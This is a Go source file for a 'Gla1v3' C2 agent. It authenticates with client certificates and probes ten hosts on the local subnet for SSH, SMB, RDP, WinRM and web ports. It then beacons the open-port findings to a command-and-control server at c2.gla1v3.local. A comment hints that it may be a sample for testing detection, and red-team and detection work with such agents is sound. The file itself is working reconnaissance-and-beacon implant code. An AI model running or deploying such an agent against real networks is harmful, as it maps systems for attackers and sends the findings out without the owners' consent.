package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"time"
)

// Agent that scans the local network (port scanning is suspicious)
func main() {
	// Load certificates
	certPath := os.Getenv("AGENT_CERT_PATH")
	keyPath := os.Getenv("AGENT_KEY_PATH")
	if certPath == "" {
		certPath = "../../certs/agent-client.crt"
	}
	if keyPath == "" {
		keyPath = "../../certs/agent-client.key"
	}

	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		log.Fatal("Failed to load cert/key:", err)
	}

	caPath := os.Getenv("AGENT_CA_PATH")
	if caPath == "" {
		caPath = "../../certs/ca.crt"
	}

	caCert, err := os.ReadFile(caPath)
	if err != nil {
		log.Fatal("Failed to read CA cert:", err)
	}
	caCertPool := x509.NewCertPool()
	if !caCertPool.AppendCertsFromPEM(caCert) {
		log.Fatal("Failed to append CA cert to pool")
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      caCertPool,
		ServerName:   "c2.gla1v3.local",
		MinVersion:   tls.VersionTLS12,
	}

	client := &http.Client{
		Transport: &http.Transport{TLSClientConfig: tlsConfig},
		Timeout:   30 * time.Second,
	}

	agentID := "netscan-" + fmt.Sprintf("%d", time.Now().UnixNano())

	log.Printf("Starting network scan agent: %s", agentID)

	// Get local network interface
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		log.Fatal("Failed to get interfaces:", err)
	}

	var localNet *net.IPNet
	for _, addr := range addrs {
		if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				localNet = ipnet
				break
			}
		}
	}

	if localNet == nil {
		log.Fatal("No suitable network interface found")
	}

	log.Printf("Scanning network: %s", localNet)

	// Scan common ports on local subnet
	commonPorts := []int{22, 80, 135, 139, 443, 445, 3389, 5985, 8080}
	results := make(map[string]interface{})
	results["agent_type"] = "network-scan"
	results["timestamp"] = time.Now().UTC().Format(time.RFC3339)
	results["network"] = localNet.String()
	results["hosts"] = make([]interface{}, 0)

	// Scan first 10 IPs in subnet
	ip := localNet.IP.Mask(localNet.Mask)
	for i := 1; i <= 10; i++ {
		ip[3] = byte(i)
		targetIP := ip.String()
		
		hostResult := map[string]interface{}{
			"ip":    targetIP,
			"ports": make([]interface{}, 0),
		}

		for _, port := range commonPorts {
			target := fmt.Sprintf("%s:%d", targetIP, port)
			conn, err := net.DialTimeout("tcp", target, 500*time.Millisecond)
			if err == nil {
				conn.Close()
				hostResult["ports"] = append(hostResult["ports"].([]interface{}), map[string]interface{}{
					"port":  port,
					"state": "open",
				})
				log.Printf("Found open port: %s", target)
			}
		}

		if len(hostResult["ports"].([]interface{})) > 0 {
			results["hosts"] = append(results["hosts"].([]interface{}), hostResult)
		}
	}

	// Send results to C2
	payload := map[string]interface{}{
		"agent_id": agentID,
		"output":   fmt.Sprintf("Network scan completed: %d hosts with open ports", len(results["hosts"].([]interface{}))),
		"results":  results,
		"ts":       time.Now().UTC().Format(time.RFC3339),
	}

	bodyBytes, _ := json.Marshal(payload)
	c2URL := os.Getenv("C2_URL")
	if c2URL == "" {
		c2URL = "https://c2.gla1v3.local:4443/beacon"
	}

	req, _ := http.NewRequest("POST", c2URL, bytes.NewReader(bodyBytes))
	req.Header.Set("User-Agent", "Gla1v3-NetScan/0.1")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", agentID)

	resp, err := client.Do(req)
	if err != nil {
		log.Fatalf("Failed to send results: %v", err)
	}
	defer resp.Body.Close()

	log.Printf("Results sent: %s", resp.Status)
}
